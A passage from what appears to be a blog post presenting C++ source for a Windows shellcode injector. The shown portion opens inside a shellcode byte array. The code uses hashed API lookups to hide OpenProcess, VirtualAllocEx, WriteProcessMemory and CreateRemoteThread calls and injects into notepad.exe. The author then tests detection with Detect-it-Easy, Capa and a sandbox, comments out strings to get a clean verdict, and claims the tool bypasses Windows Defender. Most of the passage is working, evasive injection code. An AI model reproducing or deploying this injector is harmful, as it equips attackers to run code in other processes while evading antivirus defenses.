A\x66\x89\x44\x24\x10\x0F\xB7\x44\x24\x0C\x0F\xB7\x4C\x24\x10\x3B\xC1\x74\x02\xEB\x05\xE9\xBA\xFE\xFF\xFF\x48\x8B\x84\x24\x80\x00\x00\x00\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x85\xC0\x75\x1C\x48\x8B\x44\x24\x18\x48\x8B\x0C\x24\x0F\xB7\x04\x48\x85\xC0\x75\x0B\x48\x8B\x44\x24\x20\x48\x8B\x40\x30\xEB\x14\x48\x8B\x44\x24\x20\x48\x8B\x00\x48\x89\x44\x24\x20\xE9\x2E\xFE\xFF\xFF\x33\xC0\x48\x83\xC4\x68\x5F\x5E\xC3";

	std::cout << "[+] Starting ..." << std::endl;
	const TCHAR* processName = TEXT("notepad.exe");
	DWORD pid = getPID(processName);
	std::cout << "PID of " << &processName << " is : " << pid << std::endl;
	
	PDWORD convertOpenProcess = getFunctionAddressByHash((char*)"kernel32", 0x4105fc56);
	customOpenProcess openProcess = (customOpenProcess)convertOpenProcess;

	PDWORD virtualAllocExFunction = getFunctionAddressByHash((char*)"kernel32", 0xaeb6049c);
	customVirtualAllocEx virtualAllocEx = (customVirtualAllocEx)virtualAllocExFunction;

	PDWORD virtualProtectFunction = getFunctionAddressByHash((char*)"kernel32", 0x820621f3);
	customVirtualProtect virtualProtect = (customVirtualProtect)virtualProtectFunction;

	PDWORD writeProcessMemoryFunction = getFunctionAddressByHash((char*)"kernel32", 0xc0088eea);
	customWriteProcessMemory writeProcessMemory = (customWriteProcessMemory)writeProcessMemoryFunction;

	PDWORD createRemoteThreadFunction = getFunctionAddressByHash((char*)"kernel32", 0xc398c463);
	customCreateRemoteThread createRemoteThread = (customCreateRemoteThread)createRemoteThreadFunction;

	PDWORD createVirtualProtectExFunction = getFunctionAddressByHash((char*)"kernel32", 0x14c8e);
	customVirtualAllocEx virtualProtectEx = (customVirtualAllocEx)createVirtualProtectExFunction;

	PDWORD convertCloseHandle = getFunctionAddressByHash((char*)"kernel32", 0xfaba0065);
	customCloseHandle closeHandle = (customCloseHandle)convertCloseHandle;

	PDWORD convertWaitForSingleObjectEx = getFunctionAddressByHash((char*)"kernel32", 0xf8d32811);
	customWaitForSingleObjectEx waitForSingleObjectEx = (customWaitForSingleObjectEx)convertWaitForSingleObjectEx;

	// std::cout << "[+] Executing OpenProcess ..." << std::endl;
	HANDLE hProcess = openProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		// std::cout << "[!] OpenProcess Failed : " << GetLastError() << std::endl;
		return -1;
	}

	// std::cout << "[+] Executing VirtualAllocEx ..." << std::endl;
	LPVOID buffer = virtualAllocEx(hProcess, NULL, sizeof shellcode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (buffer == NULL) {
		// std::cout << "[!] VirtualAllocEx Failed : " << GetLastError() << std::endl;
		return -1;
	}

	// std::cout << "[+] Executing WriteProcessMemory ..." << std::endl;
	SIZE_T bytesWritten;
	BOOL writeProcess = writeProcessMemory(
		hProcess,
		buffer,
		shellcode,
		sizeof shellcode,
		&bytesWritten
	);
	if (writeProcess == 0 || bytesWritten != sizeof(shellcode)) {
		// std::cout << "[!] WriteProcessMemory Failed : " << GetLastError() << std::endl;
		return -1;
	}

	// std::cout << "[+] Executing CreateRemoteThread ..." << std::endl;
	HANDLE hThread = createRemoteThread(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)buffer,
		NULL,
		0,
		NULL
	);
	if (hThread == NULL) {
		// std::cout << "[!] CreateRemoteThread Failed : " << GetLastError() << std::endl;
		return -1;
	}

	// std::cout << "[+] Executing WaitForSingleObjectEx ..." << std::endl;
	waitForSingleObjectEx(hThread, INFINITE, FALSE);

	// std::cout << "[+] Executing CloseHandle ..." << std::endl;
	closeHandle(hProcess);

	std::cout << "Press <ENTER> to quit ...";
	getchar();

	return 1;
}
```

![ss](/ss.jpg)

## Basic Malware Analysis

To initiate the analysis, I loaded the binary into <span style = "color:lightgreen;">Detect-it-Easy</span> to examine the file metadata. In the list of imports, I observed the inclusion of <span style = "color:lightgreen;">IsDebuggerPresent</span> along with several other APIs. It appears that these are default imports by Visual Studio. The <span style = "color:lightgreen;">entropy</span> of the binary is 5.26, which is relatively low and may not be considered suspicious.

![die](/die.jpg)

To assess the capabilities of the binary, I scanned it using the Capa tool from Mandiant. <span style = "color:lightgreen;">Capa</span> detected the utilization of the FNV-1a hashing algorithm. The detected resource is the manifest.

![capa](/capa.jpg)

For this injector to function, Notepad should already be running, and that may be the reason Hybrid-Analysis Sandbox marked it as clean. If Notepad is not running, the injector wonʼt take any action.

![hybrid](/hybrid.jpg)

I included some strings to monitor the progress of the process, but those were also detected by the sandbox. Consequently, I commented them out, and the sandbox flagged it as clean.

![strings](/strings.jpg)

Static analysis didnʼt provide any evidence indicating that the tool is an injector capable of injecting shellcode into a remote process.

## Conclusion

This shellcode injector successfully bypasses Windows Defender and pops a messagebox. It employs API hashing techniques to obfuscate API calls used for remote process injection. The injector retrieves the Process ID (PID) of the target process by enumerating all the processes running on the system. Once it identifies the PID of Notepad, it copies the shellcode into Notepadʼs memory and executes it in a newly created thread.
